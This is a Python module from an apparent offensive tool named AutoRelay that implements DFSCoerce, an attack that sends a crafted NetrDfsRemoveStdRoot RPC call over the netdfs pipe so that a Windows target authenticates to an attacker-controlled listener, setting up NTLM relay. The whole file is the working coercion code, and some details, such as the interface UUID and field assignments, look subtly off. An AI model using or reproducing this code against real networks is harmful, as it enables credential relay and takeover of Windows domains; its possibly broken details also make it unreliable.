"""
AutoRelay — DFSCoerce coercion module.
"""
from __future__ import annotations
import uuid
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import RPC_UNICODE_STRING
from util.log import get_logger

log = get_logger(__name__)
MS_DFSNM_UUID = "12345778-1234-abcd-ef00-0123456789ab"

class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (('ServerName', RPC_UNICODE_STRING), ('RootShare', RPC_UNICODE_STRING), ('ApiFlags', '<L=0'))

def trigger(target: str, listener_ip: str, username: str = "", password: str = "", domain: str = "", timeout: float = 8.0) -> bool:
    log.info(f"Triggering DFSCoerce on {target}")
    string_binding = f"ncacn_np:{target}[\\pipe\\netdfs]"
    
    try:
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_connect_timeout(timeout)
        
        # This is the magic line that bypasses the anonymous block
        if username:
            rpc_transport.set_credentials(username, password, domain)
            
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(uuid.UUID(MS_DFSNM_UUID).bytes_le)
    except Exception as e:
        log.error(f"Failed to connect: {e}")
        return False

    unc_path = f"\\\\{listener_ip}\\share"
    try:
        request = NetrDfsRemoveStdRoot()
        request['ServerName'] = "localhost"
        request['RootShare'] = unc_path
        
        try: dce.request(request)
        except Exception as e: log.debug(f"Expected error: {e}")
        
        log.info("DFSCoerce trigger sent.")
        return True
    except Exception as e:
        log.error(f"Trigger failed: {e}")
        return False
    finally:
        try: dce.disconnect()
        except: pass
